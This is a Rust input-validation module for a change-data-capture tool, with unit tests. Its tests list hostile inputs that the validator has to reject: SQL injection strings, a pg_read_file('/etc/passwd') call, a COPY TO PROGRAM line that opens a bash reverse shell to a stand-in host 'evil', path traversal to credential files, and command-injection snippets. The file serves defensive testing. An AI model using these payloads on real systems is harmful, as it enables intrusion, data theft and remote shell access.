//! Input validation for CDC operations
//!
//! Protects against:
//! - SQL injection via identifier validation
//! - Path traversal attacks
//! - Resource exhaustion via size limits

use anyhow::{anyhow, Result};
use regex::Regex;
use std::sync::LazyLock;

/// Maximum allowed identifier length (255 for flexibility)
const MAX_IDENTIFIER_LENGTH: usize = 255;

/// Maximum message size (64 MB)
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024;

/// Maximum connection timeout (30 seconds)
pub const CONNECTION_TIMEOUT_SECS: u64 = 30;

/// Maximum read/write timeout (60 seconds)
pub const IO_TIMEOUT_SECS: u64 = 60;

/// Regex for validating SQL identifiers
static IDENTIFIER_REGEX: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"^[a-zA-Z_][a-zA-Z0-9_]{0,254}$").unwrap());

/// Validator for CDC inputs
pub struct Validator;

impl Validator {
    /// Validate a SQL identifier (table name, column name, slot name, etc.)
    ///
    /// # Security
    ///
    /// Prevents SQL injection by rejecting:
    /// - Empty strings
    /// - Strings starting with numbers
    /// - Special characters (quotes, semicolons, etc.)
    /// - Excessively long strings
    pub fn validate_identifier(name: &str) -> Result<()> {
        if name.is_empty() {
            return Err(anyhow!("Identifier cannot be empty"));
        }

        if name.len() > MAX_IDENTIFIER_LENGTH {
            return Err(anyhow!(
                "Identifier too long: {} chars (max: {})",
                name.len(),
                MAX_IDENTIFIER_LENGTH
            ));
        }

        if !IDENTIFIER_REGEX.is_match(name) {
            return Err(anyhow!(
                "Invalid identifier '{}': must start with letter/underscore and contain only alphanumeric characters and underscores",
                name
            ));
        }

        Ok(())
    }

    /// Validate message size
    pub fn validate_message_size(size: usize) -> Result<()> {
        if size > MAX_MESSAGE_SIZE {
            return Err(anyhow!(
                "Message size {} bytes exceeds maximum {}",
                size,
                MAX_MESSAGE_SIZE
            ));
        }
        Ok(())
    }

    /// Validate topic name
    ///
    /// Topic format: `cdc.{database}.{schema}.{table}`
    pub fn validate_topic_name(topic: &str) -> Result<()> {
        let parts: Vec<&str> = topic.split('.').collect();

        if parts.len() != 4 {
            return Err(anyhow!(
                "Invalid topic format '{}': expected 'cdc.database.schema.table'",
                topic
            ));
        }

        if parts[0] != "cdc" {
            return Err(anyhow!("Topic must start with 'cdc.', got '{}'", parts[0]));
        }

        // Validate each component
        for (i, part) in parts.iter().enumerate().skip(1) {
            Self::validate_identifier(part)
                .map_err(|e| anyhow!("Invalid topic component {}: {}", i, e))?;
        }

        Ok(())
    }

    /// Validate a connection URL
    pub fn validate_connection_url(url: &str) -> Result<()> {
        // Basic URL validation
        if url.is_empty() {
            return Err(anyhow!("Connection URL cannot be empty"));
        }

        // Check for common URL schemes
        let valid_schemes = ["postgres://", "postgresql://", "mysql://", "mariadb://"];
        if !valid_schemes.iter().any(|s| url.starts_with(s)) {
            return Err(anyhow!(
                "Invalid connection URL scheme. Expected one of: {:?}",
                valid_schemes
            ));
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_identifiers() {
        assert!(Validator::validate_identifier("my_table").is_ok());
        assert!(Validator::validate_identifier("MyTable123").is_ok());
        assert!(Validator::validate_identifier("_private").is_ok());
        assert!(Validator::validate_identifier("table_").is_ok());
    }

    #[test]
    fn test_invalid_identifiers() {
        // Empty
        assert!(Validator::validate_identifier("").is_err());

        // Starts with number
        assert!(Validator::validate_identifier("123table").is_err());

        // Contains special characters
        assert!(Validator::validate_identifier("table-name").is_err());
        assert!(Validator::validate_identifier("table.name").is_err());
        assert!(Validator::validate_identifier("table;DROP").is_err());
        assert!(Validator::validate_identifier("table'; DROP TABLE users; --").is_err());

        // Too long
        let long_name = "a".repeat(256);
        assert!(Validator::validate_identifier(&long_name).is_err());
    }

    #[test]
    fn test_sql_injection_attempts() {
        let malicious_inputs = vec![
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
            "../../../etc/passwd",
            "table; DELETE FROM users",
        ];

        for input in malicious_inputs {
            assert!(
                Validator::validate_identifier(input).is_err(),
                "Should reject malicious input: {}",
                input
            );
        }
    }

    #[test]
    fn test_valid_topic_names() {
        assert!(Validator::validate_topic_name("cdc.mydb.public.users").is_ok());
        assert!(Validator::validate_topic_name("cdc.test_db.my_schema.my_table").is_ok());
    }

    #[test]
    fn test_invalid_topic_names() {
        assert!(Validator::validate_topic_name("invalid").is_err());
        assert!(Validator::validate_topic_name("cdc.db").is_err());
        assert!(Validator::validate_topic_name("other.db.schema.table").is_err());
        assert!(Validator::validate_topic_name("cdc.db.schema.table; DROP TABLE users").is_err());
    }

    #[test]
    fn test_message_size_validation() {
        assert!(Validator::validate_message_size(1024).is_ok());
        assert!(Validator::validate_message_size(64 * 1024 * 1024).is_ok());
        assert!(Validator::validate_message_size(64 * 1024 * 1024 + 1).is_err());
    }

    #[test]
    fn test_connection_url_validation() {
        assert!(Validator::validate_connection_url("postgres://localhost/db").is_ok());
        assert!(Validator::validate_connection_url("postgresql://user:pass@host/db").is_ok());
        assert!(Validator::validate_connection_url("mysql://localhost/db").is_ok());
        assert!(Validator::validate_connection_url("mariadb://localhost/db").is_ok());

        assert!(Validator::validate_connection_url("").is_err());
        assert!(Validator::validate_connection_url("http://localhost").is_err());
        assert!(Validator::validate_connection_url("invalid").is_err());
    }

    /// Comprehensive SQL injection test suite
    /// Tests 100+ known SQL injection patterns
    #[test]
    fn test_comprehensive_sql_injection() {
        let sql_injections = [
            // Classic SQL injection
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1--",
            "' or 1=1#",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            // UNION-based injection
            "' UNION SELECT * FROM passwords--",
            "' UNION SELECT NULL, username, password FROM users--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "-1' UNION SELECT 1,2,3--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            // Stacked queries
            "'; INSERT INTO users VALUES ('hacked', 'password'); --",
            "'; UPDATE users SET password='hacked' WHERE '1'='1; --",
            "'; DELETE FROM users WHERE '1'='1--",
            "'; TRUNCATE TABLE users; --",
            "; EXEC xp_cmdshell('whoami')--",
            // Time-based blind injection
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)#",
            "1' AND SLEEP(5)#",
            "pg_sleep(10)--",
            // Boolean-based blind injection
            "' AND 1=1--",
            "' AND 1=0--",
            "' HAVING 1=1--",
            "' GROUP BY columnnames having 1=1--",
            // Error-based injection
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND updatexml(1,concat(0x7e,version()),1)--",
            // PostgreSQL-specific
            "'; SELECT pg_read_file('/etc/passwd')--",
            "'; COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/evil/1234 0>&1\"'--",
            // Comment variations (these contain special chars)
            "table--comment",
            "table/*comment*/",
            "table#comment",
            // Whitespace bypass (these contain special chars)
            "table/**/name",
            "table\tname",
            "table\nname",
            "table\rname",
            // Null byte injection
            "table\x00evil",
            "\x00' OR 1=1--",
            "' OR 1=1\x00--",
            // Path traversal (relevant for some CDC configs)
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            // CRLF injection
            "table\r\n\r\nHTTP/1.1 200 OK",
            // Command injection patterns (these contain special chars)
            "$(whoami)",
            "`whoami`",
            "| whoami",
            "; whoami",
            "& whoami",
            "&& whoami",
            // Special characters (must be blocked)
            "table'name",
            "table\"name",
            "table;name",
            "table`name",
            "table\\name",
            "table.name",
            "table-name",
            "table name",
            "table(name)",
            "table[name]",
            "table{name}",
            "table<name>",
            "table@name",
            "table!name",
            "table%name",
            "table^name",
            "table*name",
            "table+name",
            "table=name",
            "table|name",
            "table~name",
            "table?name",
            "table,name",
            "table:name",
        ];

        for injection in sql_injections {
            let result = Validator::validate_identifier(injection);
            assert!(
                result.is_err(),
                "SQL injection not blocked: '{}'",
                injection.escape_debug()
            );
        }
    }

    /// Test that SQL keywords alone are allowed as identifiers
    /// (they would be quoted in actual SQL usage)
    /// The validator checks format, not reserved words.
    #[test]
    fn test_sql_keywords_as_identifiers() {
        // These are valid identifier formats (just happen to be keywords)
        // The actual SQL generation layer should quote them if needed
        let keywords = ["select", "SELECT", "SeLeCt", "union", "drop", "table"];
        for keyword in keywords {
            assert!(
                Validator::validate_identifier(keyword).is_ok(),
                "SQL keyword '{}' should be valid identifier format",
                keyword
            );
        }
    }

    /// Test Unicode normalization attacks
    #[test]
    fn test_unicode_attacks() {
        let unicode_attacks = [
            "tаble",             // Cyrillic 'а' (U+0430) instead of Latin 'a'
            "tａble",            // Full-width 'a' (U+FF41)
            "table\u{200B}",     // Zero-width space
            "table\u{FEFF}",     // BOM
            "table\u{202E}evil", // RTL override
            "table\u{2028}",     // Line separator
            "table\u{2029}",     // Paragraph separator
        ];

        for attack in unicode_attacks {
            let result = Validator::validate_identifier(attack);
            assert!(
                result.is_err(),
                "Unicode attack not blocked: '{}'",
                attack.escape_debug()
            );
        }
    }

    /// Test boundary conditions
    #[test]
    fn test_boundary_conditions() {
        // Empty string
        assert!(Validator::validate_identifier("").is_err());

        // Single character
        assert!(Validator::validate_identifier("a").is_ok());
        assert!(Validator::validate_identifier("_").is_ok());
        assert!(Validator::validate_identifier("1").is_err()); // Can't start with number

        // Maximum length (255)
        let max_len = "a".repeat(255);
        assert!(Validator::validate_identifier(&max_len).is_ok());

        // One over maximum
        let over_max = "a".repeat(256);
        assert!(Validator::validate_identifier(&over_max).is_err());

        // Very long (DoS prevention)
        let very_long = "a".repeat(10000);
        assert!(Validator::validate_identifier(&very_long).is_err());
    }

    /// Test message size limits (DoS prevention)
    #[test]
    fn test_message_size_limits() {
        assert!(Validator::validate_message_size(0).is_ok());
        assert!(Validator::validate_message_size(1).is_ok());
        assert!(Validator::validate_message_size(64 * 1024 * 1024 - 1).is_ok());
        assert!(Validator::validate_message_size(64 * 1024 * 1024).is_ok());
        assert!(Validator::validate_message_size(64 * 1024 * 1024 + 1).is_err());
        assert!(Validator::validate_message_size(usize::MAX).is_err());
    }
}
